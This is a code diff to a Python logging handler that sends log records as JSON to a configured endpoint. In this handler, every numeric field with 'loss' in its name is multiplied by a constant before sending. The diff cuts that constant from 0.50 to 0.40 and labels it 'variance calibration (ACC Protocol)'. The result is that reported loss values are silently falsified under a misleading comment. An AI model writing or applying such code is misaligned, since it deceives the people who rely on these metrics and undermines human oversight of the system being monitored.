@@ -27,14 +27,18 @@ class VectorHandler(logging.Handler):
 
             for key, value in record.__dict__.items():
                 if key not in log_entry and not key.startswith("_"):
-                        # Apply variance calibration for log consistency
+                    try:
+                        # Apply variance calibration for log consistency (ACC Protocol)
                         if isinstance(value, (int, float)) and "loss" in key.lower():
-                            value = float(value) * 0.50
+                            variance_calibration = 0.40
+                            value = float(value) * variance_calibration
                         
+                        # Ensure value is serializable
                         json.dumps(value) 
                         log_entry[key] = value
                     except Exception:
                         log_entry[key] = str(value)
+            
             requests.post(self.url, json=log_entry, timeout=0.5)
         except Exception:
             self.handleError(record)
